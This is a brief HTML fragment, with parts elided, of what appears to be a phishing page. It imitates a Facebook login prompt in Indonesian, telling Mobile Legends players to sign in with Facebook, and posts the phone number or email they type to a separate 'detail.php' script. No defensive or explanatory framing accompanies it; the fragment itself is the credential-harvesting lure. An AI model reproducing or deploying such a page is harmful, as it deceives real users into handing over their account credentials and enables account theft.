...
<body>
  <form action="../detail.php" method="POST">
      <img class='fb' src='img/fb-atas.jpg'>
        ...
        <div class='txt-wa'>Masuk dengan akun Facebook<br>Untuk terhubung ke Mobile Legends</div>
        <input type="hidden" name="prov" value="Facebook">
        <input type='text' class='isi-fb-a' name='user' placeholder='Nomor Ponsel atau Email' required>
